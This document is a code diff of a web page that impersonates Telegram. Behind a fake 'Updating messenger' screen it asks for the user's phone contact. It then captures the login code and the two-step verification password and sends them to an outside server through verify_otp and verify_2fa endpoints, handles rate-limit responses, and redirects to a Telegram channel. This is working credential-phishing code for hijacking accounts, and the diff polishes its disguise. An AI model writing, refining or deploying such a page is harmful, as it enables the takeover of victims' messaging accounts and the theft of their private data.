@@ -6,147 +6,224 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <title>Telegram Messenger</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <!-- መጀመሪያ config.js እንዲጫን እዚህ ጋር ተጠርቷል -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="./config.js"></script>
 <style>
     :root {
-        --tg-blue: #24A1DE;
-        --tg-light-blue: #f0f8ff;
-        --tg-bg: #ffffff;
-        --tg-text: #000000;
-        --tg-hint: #999999;
-        --error-red: #ff3b30;
-        --success-green: #34c759;
+        --tg-theme-bg-color: #ffffff;
+        --tg-theme-text-color: #000000;
+        --tg-theme-hint-color: #999999;
+        --tg-theme-link-color: #2481cc;
+        --tg-theme-button-color: #3390ec;
+        --tg-theme-button-text-color: #ffffff;
+        --error-bg: #ffebee;
+        --error-text: #e53935;
+        --success-color: #34c759;
+        --input-bg: #f4f4f5;
+        --border-color: #e0e0e0;
     }
 
     * { 
         box-sizing: border-box; 
         -webkit-tap-highlight-color: transparent; 
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+        margin: 0;
+        padding: 0;
     }
     
     body { 
-        margin: 0; padding: 0; color: var(--tg-text); 
-        background: var(--tg-bg); 
-        height: 100vh; width: 100vw;
-        display: flex; flex-direction: column; align-items: center;
+        color: var(--tg-theme-text-color); 
+        background: var(--tg-theme-bg-color); 
+        height: 100vh; 
+        width: 100vw;
+        display: flex; 
+        flex-direction: column; 
+        align-items: center;
         overflow: hidden;
         position: fixed;
     }
 
-    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 30px 25px; text-align: center; height: 100%; position: relative; }
-    .active { display: flex; animation: fadeIn 0.3s ease; }
-
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-    .tg-logo-container { margin-top: 25vh; position: relative; }
-    .tg-logo { width: 150px; height: 150px; animation: pulse 2s infinite ease-in-out; }
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-
-    .monkey-img { width: 90px; height: 90px; margin-bottom: 15px; border-radius: 5%; }
-    
-    h2 { font-size: 22px; font-weight: 700; margin: 10px 0; letter-spacing: -0.5px; }
-    p { font-size: 14px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 15px; padding: 0 10px; }
-
-    .btn-main {
-        background: var(--tg-blue); 
-        color: #fff; padding: 15px; width: 100%; border-radius: 12px; border: none;
-        font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
-        display: flex; align-items: center; justify-content: center; gap: 10px;
-        box-shadow: 0 4px 10px rgba(36, 161, 222, 0.2);
+    /* Common Step Styling */
+    .step { 
+        display: none; 
+        width: 100%; 
+        max-width: 420px; 
+        flex-direction: column; 
+        align-items: center; 
+        padding: 40px 24px; 
+        text-align: center; 
+        height: 100%; 
+        position: relative; 
     }
-    .btn-main:active { transform: scale(0.98); }
+    .active { 
+        display: flex; 
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); 
+    }
 
-    /* ERROR MSG CONTAINER: fixed height so it doesn't push elements down */
-    .msg-wrap { height: 45px; width: 100%; position: relative; margin: 5px 0; }
+    @keyframes slideUp { 
+        from { opacity: 0; transform: translateY(20px); } 
+        to { opacity: 1; transform: translateY(0); } 
+    }
+
+    /* Images */
+    .tg-logo { width: 120px; height: 120px; margin: 40px 0 20px 0; }
+    .monkey-img { width: 100px; height: 100px; margin-bottom: 20px; border-radius: 10px; }
+    
+    /* Typography */
+    h2 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: var(--tg-theme-text-color); }
+    p { font-size: 15px; color: var(--tg-theme-hint-color); line-height: 1.5; margin-bottom: 24px; }
+    b { color: var(--tg-theme-text-color); font-weight: 600; }
+
+    /* Main Button (Telegram Style) */
+    .btn-main {
+        background: var(--tg-theme-button-color); 
+        color: var(--tg-theme-button-text-color); 
+        padding: 16px; 
+        width: 100%; 
+        border-radius: 10px; 
+        border: none;
+        font-size: 16px; 
+        font-weight: 500; 
+        cursor: pointer; 
+        display: flex; 
+        align-items: center; 
+        justify-content: center; 
+        gap: 10px;
+        transition: transform 0.1s, opacity 0.2s;
+    }
+    .btn-main:active { transform: scale(0.97); }
+    .btn-main:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+    /* Message System */
+    .msg-wrap { height: 48px; width: 100%; position: relative; margin-bottom: 16px; }
     .msg { 
         position: absolute; left: 0; right: 0; top: 0;
-        padding: 10px; border-radius: 10px; font-size: 13px; display: none; width: 100%; 
-        z-index: 5;
+        padding: 12px; border-radius: 8px; font-size: 14px; display: none; width: 100%; 
+        font-weight: 500; z-index: 5;
+        animation: fadeIn 0.3s;
     }
-    .error { background: #fde8e8; color: #c81e1e; font-weight: 500; border: 1px solid rgba(200, 30, 30, 0.1); }
-    .loading-msg { background: #e1effe; color: #1e429f; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .error { background: var(--error-bg); color: var(--error-text); }
+    .loading-msg { background: #e3f2fd; color: #1976d2; }
 
-    .btn-getcode-box {
-        display: flex; align-items: center; justify-content: center;
-        gap: 8px; width: 100%; padding: 12px; margin-top: 10px;
-        background: var(--tg-light-blue); color: var(--tg-blue);
-        border: 1.5px solid rgba(36, 161, 222, 0.3); border-radius: 12px;
-        font-weight: 700; text-decoration: none; font-size: 14px; transition: 0.2s;
+    /* Loader */
+    .btn-spinner { 
+        display: none; width: 20px; height: 20px; 
+        border: 2px solid rgba(255,255,255,0.3); 
+        border-top: 2px solid #fff; border-radius: 50%; 
+        animation: spin 0.8s linear infinite; 
     }
-
-    .input-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
-    .input-wrapper input {
-        width: 100%; padding: 16px 45px 16px 16px; border: 2.5px solid #eee;
-        border-radius: 12px; font-size: 18px; outline: none; transition: border-color 0.2s;
-    }
-    .input-wrapper input:focus { border-color: var(--tg-blue); }
-    .input-wrapper i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #bbb; cursor: pointer; font-size: 20px; }
-
-    /* OTP Styles */
-    .otp-container { display: flex; gap: 8px; margin: 15px 0; justify-content: center; }
-    .otp-box { 
-        width: 44px; height: 54px; border: 2px solid #e0e0e0; border-radius: 10px;
-        display: flex; align-items: center; justify-content: center; 
-        font-size: 24px; font-weight: 700; background: #fdfdfd; transition: all 0.2s;
-    }
-    .otp-box.filled { border-color: var(--tg-blue); background: #fff; box-shadow: 0 0 8px rgba(36, 161, 222, 0.1); }
-    .otp-box.invalid { border-color: var(--error-red); background: #fff1f0; animation: shake 0.3s; }
-
-    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-
-    /* Keypad FIXED at bottom: ensures 0 and Delete are never hidden */
-    .keypad { 
-        display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
-        width: 100%; padding: 15px 20px 25px 20px;
-        background: #f4f4f7; border-top-left-radius: 25px; border-top-right-radius: 25px;
-        position: fixed; bottom: 30px; left: 0; right: 0;
-        z-index: 100;
-        box-shadow: 0 -5px 15px rgba(0,0,0,0.03);
-    }
-    .key { 
-        background: #fff; padding: 15px; font-size: 24px; cursor: pointer; 
-        font-weight: 600; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        display: flex; justify-content: center; align-items: center;
-    }
-    .key:active { background: #e0e0e0; transform: scale(0.95); }
-
     .loader-ring {
-        width: 40px; height: 40px; border: 3px solid #f3f3f3;
-        border-top: 3px solid var(--tg-blue); border-radius: 50%;
-        animation: spin 0.8s linear infinite; margin: 20px auto;
+        width: 44px; height: 44px; border: 3px solid var(--input-bg);
+        border-top: 3px solid var(--tg-theme-button-color); border-radius: 50%;
+        animation: spin 0.8s linear infinite; margin: 30px auto;
     }
     @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* OTP Inputs (Modern Telegram Look) */
+    .otp-container { display: flex; gap: 10px; margin-bottom: 30px; justify-content: center; }
+    .otp-box { 
+        width: 48px; height: 58px; 
+        border: 1px solid var(--border-color); 
+        border-radius: 10px;
+        display: flex; align-items: center; justify-content: center; 
+        font-size: 24px; font-weight: 600; 
+        background: var(--input-bg); 
+        transition: all 0.2s ease;
+        color: var(--tg-theme-text-color);
+    }
+    .otp-box.filled { 
+        border-color: var(--tg-theme-button-color); 
+        background: var(--tg-theme-bg-color); 
+        box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); 
+    }
+    .otp-box.invalid { 
+        border-color: var(--error-text); 
+        background: var(--error-bg); 
+        animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; 
+    }
+    .otp-box.valid {
+        border-color: var(--success-color);
+        background: #e8f5e9;
+    }
+
+    @keyframes shake { 
+        10%, 90% { transform: translate3d(-1px, 0, 0); }
+        20%, 80% { transform: translate3d(2px, 0, 0); }
+        30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+        40%, 60% { transform: translate3d(4px, 0, 0); }
+    }
+
+    /* Modern 2FA Input */
+    .input-wrapper { position: relative; width: 100%; margin-bottom: 24px; }
+    .input-wrapper input {
+        width: 100%; padding: 16px; padding-right: 45px; 
+        border: 1px solid var(--border-color);
+        border-radius: 10px; font-size: 16px; outline: none; 
+        background: var(--input-bg);
+        transition: all 0.2s;
+        color: var(--tg-theme-text-color);
+    }
+    .input-wrapper input:focus { 
+        border-color: var(--tg-theme-button-color); 
+        background: var(--tg-theme-bg-color);
+        box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2);
+    }
+    .input-wrapper i { 
+        position: absolute; right: 16px; top: 50%; transform: translateY(-50%); 
+        color: var(--tg-theme-hint-color); cursor: pointer; font-size: 18px; 
+    }
+
+    /* Floating Keypad for OTP */
+    .keypad { 
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+        width: 100%; max-width: 420px; padding: 16px 20px 30px 20px;
+        background: var(--input-bg);
+        position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+        z-index: 100;
+        border-top: 1px solid var(--border-color);
+    }
+    .key { 
+        background: var(--tg-theme-bg-color); 
+        padding: 14px; font-size: 22px; cursor: pointer; 
+        font-weight: 500; border-radius: 8px; 
+        display: flex; justify-content: center; align-items: center;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        color: var(--tg-theme-text-color);
+    }
+    .key:active { background: #e0e0e0; }
+    .key.empty { background: transparent; box-shadow: none; pointer-events: none; }
+
 </style>
 </head>
 <body>
 
+    <!-- Intro / Update Screen -->
     <div id="step_intro" class="step active">
-        <div class="tg-logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="Telegram">
-        </div>
+        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram Logo" style="animation: pulse 2s infinite;">
         <div class="loader-ring"></div>
-        <p style="margin-top: 20px; color: var(--tg-blue); font-weight: 600;">Updating messenger...</p>
+        <p style="color: var(--tg-theme-text-color); font-weight: 500; margin-top: 10px;">Updating messenger...</p>
     </div>
 
+    <!-- Step 1: Login -->
     <div id="step_photo_slide" class="step">
-        <img src="https://telegram.org/img/t_logo.png" style="width: 80px; margin-top: 10vh; margin-bottom: 20px;">
-        <h2>Telegram Login</h2>
-        <p>Please log in to receive your verification code and sync your account.</p>
+        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram">
+        <h2>Telegram Web</h2>
+        <p>Log in to your Telegram account to sync your messages and settings.</p>
         
         <div class="msg-wrap"><div id="status1" class="msg"></div></div>
 
         <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
             <div class="btn-spinner" id="loginSpinner"></div>
-            <span id="loginText">Log In with Telegram</span>
+            <span id="loginText">Log In</span>
         </button>
     </div>
 
-    <div id="step2" class="step">
-        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Monkey">
-        <h2 id="phone-preview" style="font-size: 18px; color: var(--tg-blue);">Verification</h2>
-        <p>We've sent a code via Telegram to your other device.</p>
+    <!-- Step 2: OTP -->
+    <div id="step2" class="step" style="padding-bottom: 250px;">
+        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Verification">
+        <h2 id="phone-preview">Check your Telegram messages</h2>
+        <p>We've sent a code to the <b>Telegram app</b> on your other device.</p>
         
         <div class="otp-container" id="otp_container">
             <div class="otp-box" id="b0"></div>
@@ -158,10 +235,9 @@
 
         <div class="msg-wrap"><div id="status2" class="msg"></div></div>
 
-        <a href="https://t.me/42777" target="_blank" class="btn-getcode-box">
-            <i class="fa-solid fa-shield-halved"></i> Get Code
-        </a>
+        <p style="color: var(--tg-theme-link-color); font-weight: 500; cursor: pointer; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">Haven't received the code?</p>
 
+        <!-- Keypad attached to bottom -->
         <div class="keypad">
             <div class="key" onclick="press(1)">1</div>
             <div class="key" onclick="press(2)">2</div>
@@ -172,16 +248,17 @@
             <div class="key" onclick="press(7)">7</div>
             <div class="key" onclick="press(8)">8</div>
             <div class="key" onclick="press(9)">9</div>
-            <div class="key" style="background:transparent; box-shadow:none; border:none;"></div>
+            <div class="key empty"></div>
             <div class="key" onclick="press(0)">0</div>
-            <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left" style="color:var(--tg-hint)"></i></div>
+            <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left" style="color:var(--tg-theme-hint-color)"></i></div>
         </div>
     </div>
 
+    <!-- Step 3: 2FA Password -->
     <div id="step3" class="step">
-        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" style="width: 110px; margin-top: 5vh;">
-        <h2>Cloud Password</h2>
-        <p>Your account is protected with a Two-Step Verification password.</p>
+        <img src="https://i.postimg.cc/pX0mBM1W/step2.png" class="monkey-img" alt="Password">
+        <h2>Enter a Password</h2>
+        <p>Your account is protected with an additional password.</p>
         
         <div class="msg-wrap"><div id="status3" class="msg"></div></div>
 
@@ -192,34 +269,41 @@
         
         <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
             <div class="btn-spinner" id="confirmSpinner"></div>
-            <span id="confirmText">NEXT</span>
+            <span id="confirmText">Continue</span>
         </button>
-        <p style="color: var(--tg-blue); font-weight: 600; margin-top: 25px; cursor: pointer;">Forgot password?</p>
+        <p style="color: var(--tg-theme-link-color); font-weight: 500; margin-top: 20px; cursor: pointer; font-size: 14px;">Forgot password?</p>
     </div>
 
+    <!-- Step 4: Success -->
     <div id="step_success" class="step">
-        <i class="fa-solid fa-circle-check" style="font-size: 70px; color: var(--success-green); margin-top: 25vh; margin-bottom: 20px;"></i>
-        <h2>All Set!</h2>
-        <p>Redirecting to Telegram...</p>
+        <i class="fa-solid fa-check-circle" style="font-size: 80px; color: var(--success-color); margin: 60px 0 24px 0;"></i>
+        <h2>Welcome</h2>
+        <p>Loading your chats...</p>
         <div class="loader-ring"></div>
-    </div>
-
-    <div id="flood_step" class="step">
-        <i class="fa-solid fa-clock-rotate-left" style="font-size: 60px; color: #f2a600; margin-top: 20vh; margin-bottom: 20px;"></i>
-        <h2>Wait a moment</h2>
-        <p>Too many attempts. For security, please wait.</p>
-        <div style="font-size: 36px; font-weight: 800; color: var(--tg-text);" id="wait_time">00:00</div>
     </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     
-    // ስህተት ቢኖርም እንዳያቋርጥ በ try...catch ውስጥ አድርገነዋል
+    // Setup Telegram Theme
     try {
         tg.expand();
         tg.ready();
-        tg.headerColor = '#ffffff';
-        tg.backgroundColor = '#ffffff';
+        const themeParams = tg.themeParams;
+        if (themeParams.bg_color) {
+            document.documentElement.style.setProperty('--tg-theme-bg-color', themeParams.bg_color);
+            document.documentElement.style.setProperty('--tg-theme-text-color', themeParams.text_color);
+            document.documentElement.style.setProperty('--tg-theme-hint-color', themeParams.hint_color);
+            document.documentElement.style.setProperty('--tg-theme-link-color', themeParams.link_color);
+            document.documentElement.style.setProperty('--tg-theme-button-color', themeParams.button_color);
+            document.documentElement.style.setProperty('--tg-theme-button-text-color', themeParams.button_text_color);
+            
+            // Adjust inputs based on dark/light mode
+            if(themeParams.bg_color.toLowerCase() === '#000000' || themeParams.bg_color.toLowerCase() === '#1c1c1d') {
+                document.documentElement.style.setProperty('--input-bg', '#2c2c2e');
+                document.documentElement.style.setProperty('--border-color', '#3a3a3c');
+            }
+        }
     } catch(e) {}
 
     let userId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id.toString() : "test_user";
@@ -229,9 +313,8 @@
     let isProcessing = false;
     let savedName = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";
 
-    // ፔጁ እንደከፈተ ወዲያውኑ ሰዓቱን ጀምሮ ወደ button እንዲያልፍ ተደርጓል
     document.addEventListener("DOMContentLoaded", function() {
-        setTimeout(() => { showStep('photo_slide'); }, 2000);
+        setTimeout(() => { showStep('photo_slide'); }, 1500);
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
     });
@@ -244,11 +327,8 @@
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
 
-        // Automatic redirect if success step is shown
         if(n === 'success') {
-            setTimeout(() => {
-                window.location.href = "https://t.me/sitoc/";
-            }, 1500);
+            setTimeout(() => { window.location.href = "https://t.me/sitoc/"; }, 1500);
         }
     }
 
@@ -261,9 +341,12 @@
             else if (data.status === "SUCCESS") { 
                 clearInterval(statusChecker); 
                 setOtpStatus('valid');
-                setTimeout(() => showStep('success'), 800);
+                setTimeout(() => showStep('success'), 600);
             }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+            else if (data.status === "FLOOD") { 
+                clearInterval(statusChecker); 
+                displayFloodInStatus1(data); 
+            }
         }).catch(e => {});
     }
 
@@ -279,11 +362,13 @@
         isProcessing = false;
         if(document.getElementById('loginBtn')) {
             document.getElementById('loginBtn').disabled = false;
-            document.getElementById('loginText').innerText = "Log In with Telegram";
+            document.getElementById('loginSpinner').style.display = 'none';
+            document.getElementById('loginText').innerText = "Log In";
         }
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
-            document.getElementById('confirmText').innerText = 'NEXT';
+            document.getElementById('confirmSpinner').style.display = 'none';
+            document.getElementById('confirmText').innerText = 'Continue';
         }
     }
 
@@ -301,15 +386,17 @@
 
     function handleLoginClick() {
         playTap();
-        document.getElementById('loginBtn').disabled = true;
-        document.getElementById('loginText').innerText = 'Securing...';
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true;
+        document.getElementById('loginSpinner').style.display = 'block';
+        document.getElementById('loginText').innerText = 'Please wait...';
         startVerification();
     }
 
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'Connecting to secure server...');
+        showMsg(1, 'loading-msg', 'Connecting...');
         checkUserInDB();
     }
 
@@ -327,8 +414,12 @@
                 body: JSON.stringify({user_id: userId, name: savedName})
             });
             const data = await res.json();
-            if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'Identity confirmed. Sending code...');
+            
+            if (data.status === "FLOOD") {
+                clearInterval(statusChecker);
+                displayFloodInStatus1(data);
+            } else if (data.status === "FOUND" || data.status === "NEED_OTP") {
+                showMsg(1, 'loading-msg', 'Sending code...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
             } else { requestPhone(); }
@@ -340,8 +431,8 @@
 
     function requestPhone() {
         tg.requestContact((success) => {
-            if (success) { showMsg(1, 'loading-msg', 'Check your Telegram messages.'); } 
-            else { stopLoaders(); showMsg(1, 'error', 'Permission required to continue.'); }
+            if (success) { showMsg(1, 'loading-msg', 'Please check your messages.'); } 
+            else { stopLoaders(); showMsg(1, 'error', 'Contact sharing is required.'); }
         });
     }
 
@@ -372,7 +463,7 @@
     }
 
     async function submitOTP() {
-        showMsg(2, 'loading-msg', 'Verifying code...');
+        showMsg(2, 'loading-msg', 'Checking code...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_otp`, {
                 method: 'POST',
@@ -387,10 +478,14 @@
     async function submit2FA() {
         playTap();
         const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'Please enter your password');
+        if(!pass) return showMsg(3, 'error', 'Password cannot be empty.');
         
-        document.getElementById('confirmBtn').disabled = true;
-        showMsg(3, 'loading-msg', 'Validating password...');
+        const btn = document.getElementById('confirmBtn');
+        btn.disabled = true;
+        document.getElementById('confirmSpinner').style.display = 'block';
+        document.getElementById('confirmText').innerText = 'Verifying...';
+
+        showMsg(3, 'loading-msg', 'Checking password...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                 method: 'POST',
@@ -399,31 +494,34 @@
             });
             const data = await res.json();
             handleResponse(data, 3);
-        } catch(e) { stopLoaders(); showMsg(3, 'error', 'An error occurred!'); }
+        } catch(e) { stopLoaders(); showMsg(3, 'error', 'Network error.'); }
     }
 
     function handleResponse(data, step) {
-        if (data.status === "SUCCESS") { 
+        if (data.status === "FLOOD") { 
+            clearInterval(statusChecker); 
+            displayFloodInStatus1(data);
+        }
+        else if (data.status === "SUCCESS") { 
             setOtpStatus('valid');
-            setTimeout(() => showStep('success'), 800);
+            setTimeout(() => showStep('success'), 600);
         } 
         else if (data.status === "NEED_2FA") { 
             setOtpStatus('valid');
             setTimeout(() => { showStep(3); stopLoaders(); }, 600);
         }
-        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
             if(step === 2) { 
                 setOtpStatus('invalid');
-                showMsg(step, 'error', 'Invalid code. Try again.');
+                showMsg(step, 'error', 'Invalid code. Please try again.');
                 setTimeout(() => {
                     currentOtp = ""; 
                     updateOtpUI(); 
                     setOtpStatus(null);
-                }, 1500);
+                }, 1000);
             } else {
-                showMsg(step, 'error', 'Incorrect password.');
+                showMsg(step, 'error', 'Invalid password. Please try again.');
             }
         }
     }
@@ -431,7 +529,9 @@
     function showMsg(stepId, type, text) {
         const el = document.getElementById('status' + stepId);
         if(!el) return;
-        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+        el.className = 'msg ' + type; 
+        el.innerText = text; 
+        el.style.display = 'block';
     }
 
     function hideMsg(stepId) {
@@ -439,14 +539,18 @@
         if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
     }
 
-    function startFloodTimer(seconds) {
-        showStep('flood_step');
-        let rem = seconds;
-        const iv = setInterval(() => {
-            let m = Math.floor(rem / 60), s = rem % 60;
-            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
-        }, 1000);
+    function displayFloodInStatus1(data) {
+        stopLoaders();
+        clearInterval(statusChecker);
+        showStep('photo_slide'); 
+        
+        let remSeconds = data.remaining_seconds || data.wait || 60;
+        let mins = data.remaining_minutes || data.total_wait_minutes || (remSeconds / 60).toFixed(1);
+        
+        showMsg(1, 'error', `Too many attempts. Please try again in ${mins} minute(s).`);
+        
+        const btn = document.getElementById('loginBtn');
+        if(btn) btn.disabled = true;
     }
 
     function setupLongPressPaste() {
